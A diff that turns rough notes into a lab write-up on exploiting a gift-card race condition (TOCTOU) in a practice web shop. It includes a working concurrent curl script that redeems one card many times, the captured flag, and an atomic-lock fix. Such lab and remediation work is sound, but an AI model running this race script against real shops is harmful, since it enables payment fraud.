@@ -1,50 +1,67 @@
-lets see ...
-i am going to preform a white-box penetration testing instead of black-box this time 
-there is one gift card so it cant be the logic flow where you can use multiple cards multiple times
-lets see if it checks if the card is used or not 
-it verifies it :
-    state["giftcard_used"] = True
-but also huge note here :
-    time.sleep(0.25) 
-its the same lab we solved before 
-Time-Of-Check-Time-Of-Use
-TOCTOU
-i can re-use the script of it but with editing some lines of it
-ohhh opus left another logic bug where if u just submit the gift-card even if u didnt do a checkout u cant use it again
-changing the endpoint of the script to -> /api/redeem-giftcard
-changing the port to -> 9004
-changing the command card ->         ["curl", "-s", "--no-keepalive", "-X", "POST", f"{URL}/api/redeem-giftcard", "-H   ", "Content-Type: application/json", "-d", '{"code": "WELCOME100"}']
-got error trying this :
-import subprocess
+# Methodology — LOOM & CO (Race Condition / TOCTOU)
 
+My working notes while solving this lab.
+
+## 1. Approach
+
+Went white-box this time. There's a single one-time gift card, so this isn't a "reuse multiple cards"
+logic flaw — I looked at *how* the single use is enforced.
+
+The redemption code checks whether the card was used and sets the flag:
+
+```python
+state["giftcard_used"] = True
+```
+
+But there's a big tell right above it:
+
+```python
+time.sleep(0.25)
+```
+
+Same pattern as a lab I solved before — **Time-Of-Check to Time-Of-Use (TOCTOU)**. The check and the
+update aren't atomic, and the `sleep` widens the window. I can reuse my earlier race script with a few
+edits.
+
+## 2. Exploitation
+
+Pointed the script at the redeem endpoint (`/api/redeem-giftcard`, port 9004) and fired concurrent
+requests so many pass the "is it used?" check before any of them sets the flag:
+
+```python
+import subprocess, threading
 
 def worker(i):
-  barrier.wait()
-  try:
+    barrier.wait()                       # release all threads at once
     out = subprocess.check_output([
-        "curl",
-        "-s",
-        "--no-keepalive",
-        "-X",
-        "POST",
-        f"{URL}/api/redeem-giftcard",
-        "-H",
-        "Content-Type: application/json",
-        "-d",
-        '{"code": "WELCOME100"}',
+        "curl", "-s", "-X", "POST", f"{URL}/api/redeem-giftcard",
+        "-H", "Content-Type: application/json",
+        "-d", '{"code": "WELCOME100"}',
     ])
     results[i] = out.decode().strip()
-  except subprocess.CalledProcessError as e:
-    results[i] = f"Error: {e.output.decode().strip()}"
+```
 
-it did work actually
-got the flag : FLAG{r4c3_c0nd1t10n_1n_th3_ch3ck0ut}
-fixing the 2 logic flows
-TOCTOU Fix :
-    import threading
-    lock = threading.Lock()
-    check first is done 
-    removing sleep function
-    done
+The burst stacks the credit well past the limited item's price. Checkout → flag:
 
+```
+FLAG{r4c3_c0nd1t10n_1n_th3_ch3ck0ut}
+```
 
+## 3. Remediation
+
+Fix the TOCTOU by making the check-and-update **atomic** — not by removing the `sleep` (that only
+shrinks the window):
+
+```python
+import threading
+lock = threading.Lock()
+
+with lock:
+    if not state["giftcard_used"]:
+        state["giftcard_used"] = True
+        state["credit"] += 100.00
+```
+
+In a real system the database enforces this: a single conditional write
+(`UPDATE ... SET used=1 WHERE code=? AND used=0`) acting only if exactly one row changed, or a unique
+constraint on the redemption.
